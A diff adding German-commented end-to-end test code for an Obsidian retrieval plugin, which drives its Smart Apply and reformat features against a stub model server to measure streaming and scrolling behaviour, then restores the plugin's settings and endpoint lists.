+            const f = app.vault.getMarkdownFiles().find(x => x.path.startsWith("Notes/") && x.stat.size > 200 && !x.path.startsWith("Notes/Integrator"));
+            if (!f) return false;
+            const leaf = app.workspace.getLeaf("tab"); window.__w20Leaf = leaf;
+            await leaf.openFile(f, { state: { mode: "source" } });
+            app.workspace.setActiveLeaf(leaf, { focus: true });
+            await new Promise(r => setTimeout(r, 800));
+            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+            await p.openHub("smart-apply");
+            await new Promise(r => setTimeout(r, 2500));
+            const run = document.querySelector(".vault-rag-sa-run");
+            if (!run || run.disabled || run.classList.contains("is-disabled")) return false;
+            run.click();
+            return true;`);
+          if (!gestartet) {
+            for (const n of [N.saKontrolle, N.saFolge, N.saDenk]) unmeasured(n, "Lauf-Knopf nicht bedienbar (keine Vorlage/Notiz im Fixture?) — nichts gemessen");
+          } else {
+            // Denkblock live: Reasoning wächst, bevor die Antwort beginnt.
+            const denkSel = `const r = document.querySelector(".vault-rag-sa-running-stream .okit-stream-reasoning pre"); const t = document.querySelector(".vault-rag-sa-running-stream .okit-stream-tail"); const d = document.querySelector(".vault-rag-sa-running-stream .okit-stream-reasoning");
+              return { denk: r ? (r.textContent || "").length : -1, tail: t ? (t.textContent || "").length : -1, offen: Boolean(d && d.open) };`;
+            const erst = await pollUntil<{ denk: number; tail: number; offen: boolean }>(main, `const m = (() => { ${denkSel} })(); return m.denk > 0 ? m : null;`, 20_000, 100);
+            if (!erst) record(N.saDenk, false, "kein Reasoning-Text im laufenden Bereich innerhalb von 20 s");
+            else {
+              await new Promise((r) => setTimeout(r, 700));
+              const zweit = await main.evaluate<{ denk: number; tail: number; offen: boolean }>(denkSel);
+              if (zweit.tail > 0 || stub.zaehler().unterwegs === 0) unmeasured(N.saDenk, `Messung ungültig: der Strom war beim zweiten Messwert schon bei der Antwort (${zweit.tail} Zeichen) oder zu Ende`);
+              else record(N.saDenk, erst.tail === 0 && erst.offen && zweit.denk > erst.denk,
+                `Denktext ${erst.denk} → ${zweit.denk} Zeichen, Antwort ${erst.tail} → ${zweit.tail} Zeichen, Block offen: ${erst.offen ? "ja" : "nein"}`);
+            }
+            // Folge-Regel in der Antwortphase (der Bereich selbst scrollt: .okit-stream-body, 220 px hoch).
+            zeichneFolge({ kontrolle: N.saKontrolle, folge: N.saFolge }, await messeFolge(main, ".vault-rag-sa-running-stream .okit-stream-body", stub));
+          }
+        } catch (e) {
+          for (const n of [N.saKontrolle, N.saFolge, N.saDenk]) if (!bilanz.eintraege().some((x) => x.name === n)) unmeasured(n, `Messung abgebrochen: ${String(e)}`);
+        } finally {
+          await main.evaluate(`
+            document.querySelector(".vault-rag-sa-stop")?.click();
+            try { window.__w20Leaf?.detach(); } catch {} delete window.__w20Leaf;
+            return true;`).catch(() => undefined);
+          await stub.trenneAlle();
+          if (saWas) {
+            await main.evaluate(`
+              const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+              p.settings.smartApplyEnabled = !!window.__w20SmartWas; delete window.__w20SmartWas;
+              await p.saveSettings();
+              await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
+              await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
+              return true;`).catch(() => console.log("  ! Smart Apply konnte nicht zurückgestellt werden"));
+            await pollUntil(main, `return !!app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]?.api?.status().indexed;`, 30_000, 500).catch(() => false);
+          }
+          stub.antworten([]);
+        }
+        // --- Umformulieren-Modal ---------------------------------------------------------------------
+        skipped(N.rfDenk, "in dieser Lage nicht anwendbar: das Modal zeigt kein Reasoning (stream kennt nur onToken)");
+        try {
+          stub.antworten([{ text: zeilen(120), laenge: 8, takt: 40, nachlaufMs: 6000 }]);
+          const gestartet = await main.evaluate<boolean>(`
+            let f = app.vault.getAbstractFileByPath("w14-body-probe.md");
+            if (!f) f = await app.vault.create("w14-body-probe.md", "Ein kurzer Satz zum Umformen.\\n");
+            const leaf = app.workspace.getLeaf("tab"); window.__w20Leaf = leaf;
+            await leaf.openFile(f, { state: { mode: "source" } });
+            app.workspace.setActiveLeaf(leaf, { focus: true });
+            await new Promise(r => setTimeout(r, 600));
+            const ed = app.workspace.activeEditor?.editor; if (!ed) return false;
+            ed.setSelection({ line: 0, ch: 0 }, { line: 0, ch: ed.getLine(0).length });
+            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+            p.captureSelection(); p.reformatPanel?.refresh();
+            app.commands.executeCommandById("vault-retrieval:open-reformat");
+            await new Promise(r => setTimeout(r, 800));
+            const nodes = [...document.querySelectorAll(".vault-rag-reformat-group-title, .vault-rag-reformat-btn")];
+            let titles = 0; const llm = [];
+            for (const n of nodes) {
+              if (n.classList.contains("vault-rag-reformat-group-title")) { titles++; continue; }
+              if (titles === 2 && !n.closest(".vault-rag-reformat-freetext")) llm.push(n);
+            }
+            const usable = llm.filter(b => !b.disabled);
+            if (!usable.length) return false;
+            usable[0].click();
+            return true;`);
+          if (!gestartet) for (const n of [N.rfKontrolle, N.rfFolge]) unmeasured(n, "Probe-Notiz/Auswahl nicht herstellbar — nichts gemessen");
+          else zeichneFolge({ kontrolle: N.rfKontrolle, folge: N.rfFolge }, await messeFolge(main, ".vault-rag-reformat-modal", stub));
+        } catch (e) {
+          for (const n of [N.rfKontrolle, N.rfFolge]) if (!bilanz.eintraege().some((x) => x.name === n)) unmeasured(n, `Messung abgebrochen: ${String(e)}`);
+        } finally {
+          await main.evaluate(`
+            const m = document.querySelector(".vault-rag-reformat-result")?.closest(".modal");
+            const d = m && [...m.querySelectorAll("button")].find(b => /verwerf|discard/i.test(b.textContent || ""));
+            if (d) d.click();
+            try { window.__w20Leaf?.detach(); } catch {} delete window.__w20Leaf;
+            return true;`).catch(() => undefined);
+          await stub.trenneAlle();
+          stub.antworten([]);
+        }
+      }
+    }
+
     // --- 8. Auto-Heal-Kaskade: defekter Container ohne Endpunkt ------------
     // Der einzige Prüfpunkt, der die VERDRAHTUNG misst statt der Entscheidung. `planAutoHeal`
     // ist unit-getestet — der Bug von 2026-08-14 lag aber in `attemptAutoHeal`: die
@@ -2620,6 +2845,21 @@ async function main(): Promise<void> {
       `).catch(() => { console.log("  ! Reihenfolge konnte nicht zurückgeschrieben werden"); });
       console.log("\n  Reihenfolge wiederhergestellt.");
     }
+    // ZULETZT: die Blöcke davor (Heal, Reihenfolge) schreiben Listen zurück, die sie MITTEN im Lauf gesichert haben — also mit
+    // den Stub-URLs. Würde dies vorher laufen, überschrieben sie die Fixture-Listen mit Stub-Adressen (gemessen im ersten Vollauf).
+    if (stubLageSaved) {
+      await main.evaluate(`
+        const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+        const v = ${JSON.stringify(stubLageSaved)};
+        for (const l of [p.settings.embeddingEndpoints, p.settings.chatEndpoints]) {
+          for (const e of l) if (e && e.secretId) app.secretStorage.setSecret(e.secretId, "");
+        }
+        p.settings.embeddingEndpoints = v.emb; p.settings.chatEndpoints = v.chat;
+        await p.saveSettings();
+        return true;
+      `).catch(() => { console.log("  ! Fixture-Endpunkt-Listen konnten nicht zurückgeschrieben werden — `npm run shots -- --setup` stellt sie her"); });
+    }
+    if (stubLage) await stubLage.stop().catch(() => undefined);
     settings?.close();
     main.close();
   }
